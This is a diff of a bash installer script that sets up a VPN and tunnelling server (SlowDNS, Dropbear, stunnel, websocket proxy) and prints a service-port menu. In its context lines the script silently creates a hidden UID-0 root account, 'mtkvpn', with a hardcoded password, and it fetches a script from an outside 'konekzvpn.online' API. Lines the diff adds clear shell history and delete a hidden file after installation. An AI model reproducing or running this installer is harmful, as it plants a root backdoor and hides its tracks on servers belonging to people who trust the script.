@@ -1,5 +1,12 @@
 #!/bin/bash
 
+RED='\033[01;31m';
+RESET='\033[0m';
+GREEN='\033[01;32m';
+WHITE='\033[01;37m';
+YELLOW='\033[00;33m';
+
+clear
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo '                                                              
    ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
@@ -13,10 +20,20 @@ echo -e " \033[0;35m════════════════════
 echo ""
 read -p "Please enter ns host for Slowdns: " NS
 echo $NS > /root/ns.txt
+echo ""
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e " \033[0;31m Wait 10 Seconds to Start Installing!!!!\033[0m"
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+sleep 10
 
-
-startinstall(){
-apt-get update
+startinstall (){
+apt update
+apt install -y curl wget cron python-minimal libpython-stdlib
+apt install -y iptables
+apt install -y openvpn netcat httpie php neofetch vnstat
+apt install -y screen squid stunnel4 dropbear gnutls-bin python
+apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
+apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
 mkdir /etc/update-motd.d
 apt-get install inxi screenfetch lolcat figlet -y
 
@@ -41,11 +58,13 @@ rm /etc/motd
 touch /etc/motd.tail
 
 apt-get install dropbear unzip build-essential curl stunnel4 net-tools python python2 lsof git netcat -y
+sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
 sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
 sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
 useradd -p $(openssl passwd -1 mtkvpn) mtkvpn -ou 0 -g 0
+systemctl restart apache2
 service dropbear restart
 
 cat << \websocket > /usr/local/sbin/websocket.py
@@ -801,40 +820,39 @@ wget -O /root/deleted.sh "konekzvpn.online/api/premium/deleted.php?key=Tknetwork
 display_menu () {
 clear
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
+figlet -k Dex Hysteria | awk '{gsub(/./,"\033[3"int(rand()*5+1)"m&\033[0m")}1'
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 }
 
 ports () {
-echo -e " \e[92m All Service Now are Running!!!!\e[0m \e[97m:\e[0m"
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo -e " \e[92m SERVICE PORT:\e[0m \e[97m:\e[0m" 
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo ""
 echo -e " \e[92m SSH:\e[0m \e[97m: 22\e[0m" 
 echo -e " \e[92m DROPBEAR:\e[0m \e[97m: 442\e[0m" 
-echo -e " \e[92m Proxy:\e[0m \e[97m: 8080 , 8010\e[0m" 
+echo -e " \e[92m Proxy:\e[0m \e[97m: 8080 , 8181\e[0m" 
 echo -e " \e[92m WEBSOCKET/SSH:\e[0m \e[97m: 80\e[0m" 
 echo -e " \e[92m WEBSOCKET/SSL:\e[0m \e[97m: 443\e[0m"
 echo -e " \e[92m STUNNEL:\e[0m \e[97m: 443\e[0m" 
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo -e " \e[92m SlowDns Configuration:\e[0m \e[97m:\e[0m" 
 echo ""
-echo -e " \e[92m SLOWDNS PORT:\e[0m \e[97m: 442\e[0m" 
+echo -e " \e[92m SLOWDNS PORT:\e[0m \e[97m: 2222\e[0m" 
 echo -e " \e[92m SLOWCHAVE KEY:\e[0m \e[97m: 5d30d19aa2524d7bd89afdffd9c2141575b21a728ea61c8cd7c8bf3839f97032\e[0m" 
 echo -e " \e[92m NAMESERVER:\e[0m \e[97m: $NS\e[0m" 
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e ""
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e " \033[0;31m To Create Account Just Type: dextermenu\033[0m"
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e ""
+netstat -tupln
+history -c;
+rm /etc/.systemlink
 }
 
-
 startinstall
-installing_api
 clear
+installing_api
 display_menu
 ports
